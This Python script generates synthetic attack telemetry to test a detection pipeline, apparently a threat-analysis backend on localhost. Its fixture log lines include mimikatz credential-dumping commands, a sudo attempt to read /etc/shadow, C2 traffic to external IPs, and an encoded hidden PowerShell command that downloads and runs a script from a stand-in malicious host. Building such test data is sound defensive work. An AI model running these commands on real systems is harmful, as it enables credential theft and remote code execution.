#!/usr/bin/env python3
"""
Synthetic Threat Telemetry Generator for Threat Analyser.

Simulates enterprise attack footprints to test OCSF normalization,
IOC matching, Sigma rules, threshold sliding windows, and ML anomaly detection.
"""
import argparse
import json
import sys
import time
from datetime import datetime, timezone
import urllib.request
import urllib.error

ATTACK_PAYLOADS = {
    "ssh_brute_force": [
        "<86>{ts} auth-srv-01 sshd[31201]: Failed password for invalid user admin from 192.168.1.152 port 50122 ssh2",
        "<86>{ts} auth-srv-01 sshd[31202]: Failed password for invalid user admin from 192.168.1.152 port 50124 ssh2",
        "<86>{ts} auth-srv-01 sshd[31203]: Failed password for invalid user root from 192.168.1.152 port 50126 ssh2",
        "<86>{ts} auth-srv-01 sshd[31204]: Failed password for invalid user root from 192.168.1.152 port 50128 ssh2",
        "<86>{ts} auth-srv-01 sshd[31205]: Failed password for invalid user ubuntu from 192.168.1.152 port 50130 ssh2",
        "<86>{ts} auth-srv-01 sshd[31206]: Failed password for invalid user test from 192.168.1.152 port 50132 ssh2",
    ],
    "credential_dump": [
        "CEF:0|Microsoft|Windows|10.0|4688|Process Creation|Critical|filePath=C:\\Windows\\Temp\\mimikatz.exe proc=mimikatz.exe command=mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit pid=7124 shost=CORP-WS-09 user=SYSTEM",
        '{"timestamp": "{ts}", "event_category": "process", "process_name": "mimikatz.exe", "cmdline": "mimikatz.exe privilege::debug sekurlsa::minidump lsass.dmp", "username": "administrator", "src_ip": "10.0.4.19"}'
    ],
    "powershell_obfuscated": [
        "CEF:0|Microsoft|PowerShell|7.3|4104|ScriptBlock Logging|High|proc=powershell.exe filePath=powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQB1AHAAZABhAHQAZQAuAGUAeABhAG0AcABsAGUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA== pid=4312 shost=CEO-LAPTOP user=exec",
        '{"timestamp": "{ts}", "event_category": "process", "process_name": "pwsh.exe", "cmdline": "pwsh.exe -e JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQA=", "user": "finance_user"}'
    ],
    "sudo_escalation": [
        "<85>{ts} db-srv-02 sudo[14201]: intruder : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/intruder ; USER=root ; COMMAND=/bin/bash",
        "<85>{ts} db-srv-02 sudo[14202]: intruder : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/intruder ; USER=root ; COMMAND=/bin/cat /etc/shadow",
        "<85>{ts} db-srv-02 sudo[14203]: intruder : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/intruder ; USER=root ; COMMAND=/usr/bin/passwd",
    ],
    "c2_traffic": [
        '{"timestamp": "{ts}", "event_category": "network", "src_ip": "10.0.1.45", "src_port": 54120, "dest_ip": "45.155.205.233", "dest_port": 9001, "protocol": "TCP"}',
        '{"timestamp": "{ts}", "event_category": "network", "src_ip": "10.0.1.45", "src_port": 54122, "dest_ip": "185.220.101.1", "dest_port": 4444, "protocol": "TCP"}',
    ]
}


def generate_payload(attack_types: list[str]) -> str:
    now_str = datetime.now(timezone.utc).strftime("%b %d %H:%M:%S")
    now_iso = datetime.now(timezone.utc).isoformat()

    lines = []
    for att in attack_types:
        templates = ATTACK_PAYLOADS.get(att, [])
        for t in templates:
            formatted = t.replace("{ts}", now_str if "<" in t else now_iso)
            lines.append(formatted)

    return "\n".join(lines)


def push_telemetry(endpoint: str, api_key: str, logs: str):
    url = f"{endpoint.rstrip('/')}/api/ingest/push"
    data = json.dumps({"logs": logs}).encode("utf-8")
    req = urllib.request.Request(
        url,
        data=data,
        headers={
            "Content-Type": "application/json",
            "X-API-Key": api_key
        }
    )

    print(f"[*] Dispatching telemetry stream to {url}...")
    try:
        with urllib.request.urlopen(req) as resp:
            body = resp.read().decode("utf-8")
            print(f"[+] Server accepted telemetry (Status {resp.status}): {body}")
            print("[+] Check Alerts & Dashboard console at http://localhost")
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error {e.code}: {e.read().decode('utf-8')}")
    except Exception as e:
        print(f"[-] Connection Error: {e}")


def main():
    parser = argparse.ArgumentParser(description="Threat Analyser Telemetry & Attack Simulator")
    parser.add_argument(
        "--attack-type",
        choices=["ssh_brute_force", "credential_dump", "powershell_obfuscated", "sudo_escalation", "c2_traffic", "all"],
        default="all",
        help="Type of attack scenario to synthesize"
    )
    parser.add_argument("--endpoint", default="http://localhost:8000", help="Base URL of Threat Analyser backend")
    parser.add_argument("--api-key", default="sandbox_device_key", help="Device API key for authentication")
    parser.add_argument("--print-only", action="store_true", help="Print generated logs to stdout without sending")

    args = parser.parse_args()

    targets = list(ATTACK_PAYLOADS.keys()) if args.attack_type == "all" else [args.attack_type]
    log_text = generate_payload(targets)

    if args.print_only:
        print(log_text)
    else:
        print(f"[+] Synthesized {len(log_text.splitlines())} security log events for scenario: '{args.attack_type}'")
        push_telemetry(args.endpoint, args.api_key, log_text)


if __name__ == "__main__":
    main()
